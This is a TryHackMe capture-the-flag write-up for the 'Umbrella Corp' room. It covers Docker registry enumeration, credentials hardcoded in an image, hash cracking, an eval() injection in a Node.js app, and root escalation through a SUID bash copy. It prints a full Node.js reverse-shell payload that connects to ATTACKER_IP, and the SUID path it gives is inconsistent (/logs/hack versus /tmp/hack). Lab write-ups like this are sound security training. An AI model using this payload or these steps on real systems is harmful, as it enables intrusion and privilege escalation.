# Umbrella Corp – TryHackMe Write-Up

## 📌 Challenge Overview
**Difficulty:** Medium  
**Goal:** Breach Umbrella Corp's time-tracking server by exploiting misconfigurations in containerization and insecure registries.

---

## 🔍 Phase 1: Enumeration

### Port Scanning
I started by scanning the target IP to identify open services:

```bash
nmap -sC -sV <TARGET_IP>
```
Key Findings:


Port 22: SSH (OpenSSH 8.2p1)

Port 3306: MySQL 5.7.40

Port 5000: Docker Registry (API v2)

Port 8080: HTTP (Node.js Express)

Docker Registry Exploration
Navigating to http://<TARGET_IP>:5000 directly yielded nothing. Following HackTricks methodology, I enumerated the catalog:

Endpoint: http://<TARGET_IP>:5000/v2/_catalog

# Pull the image
```bash
sudo docker pull <TARGET_IP>:5000/umbrella/timetracking:latest
```

# Verify the pull
```bash
sudo docker image ls --filter reference=<TARGET_IP>:5000/umbrella/timetracking
```
# Inspect the image layers/metadata
```bash
sudo docker image inspect <TARGET_IP>:5000/umbrella/timetracking:latest
```

## 🐳 Phase 2: Docker Exploitation
Image Extraction
I pulled the image to my local machine and inspected its contents:

Result: Found a repository named umbrella/timetracking.

During inspection, I discovered hardcoded environment variables: DB_USER and DB_PASS.

## Gaining Initial Access
To interact with the environment, I ran the container locally:
```bash
sudo docker run -it --rm <IMAGE_ID> /bin/sh
```
Inside the container, I accessed the database using the discovered credentials. I found a users table containing four entries.
After cracking the hashes with Hashcat, I successfully authenticated via SSH as user claire-r.
### Flag captured: user.txt

## ⚡ Phase 3: Privilege Escalation
## Web Application Analysis
I visited the web service on Port 8080 and logged in using claire-r's credentials. The application was found to be vulnerable to eval() injection.

Reverse Shell
Using Burp Suite, I intercepted the request and injected a Node.js reverse shell payload to gain a shell as the service user.

Here is the command:
```bash
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, "ATTACKER_IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```
## Root Escalation
Once I obtained a shell, I noticed a path to root. I used the following commands to create a SUID binary:
1. Root shell
```bash
cp /bin/bash /logs/hack
```
```bash
chmod u+s /logs/hack
```
2. Claire-r shell
```bash
/tmp/hack -p
```
This granted me a root effective UID, allowing me to read the final flag.
### Flag captured: root.txt

